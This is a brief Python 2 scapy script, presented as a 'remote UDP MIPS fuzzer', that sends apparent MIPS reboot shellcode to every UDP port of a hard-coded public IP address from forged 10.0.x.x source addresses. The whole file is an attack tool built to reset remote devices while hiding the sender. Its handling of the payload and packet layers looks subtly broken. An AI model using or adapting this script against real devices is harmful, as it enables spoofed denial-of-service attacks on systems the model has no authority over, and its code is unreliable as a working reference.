#!/usr/bin/python2
#
# Name:  Matthew Beddoes
# Desc:  matty.beds@red-dragon-security.com
# 
# proj:  Remote UDP Mips Fuzzer - Reset device shellcode
# usage: Edit the remote_udp_fuzzer.py script and change the destination server
#

from scapy.all import * 

print("Remote UDP Mips Fuzzer - Reset Shellcode")
for num in range(0,10):
  data = "00" * int(str(num))
  sc = "3c06432134c6fedc3c05281234a519693c04fee13484dead24020ff80101010c"
  a = data+sc
  for ip in range(0,255):
    for port in range(0,65535):
      i=IP()
      i.dst="213.48.152.128"				#Change this
      i.src="10.0"+"."+str(ip)+"."+str(ip)
      udp=UDP()
      udp.sport=int(str(port))
      udp.dport=int(str(port))
      sendp(i/udp/a)
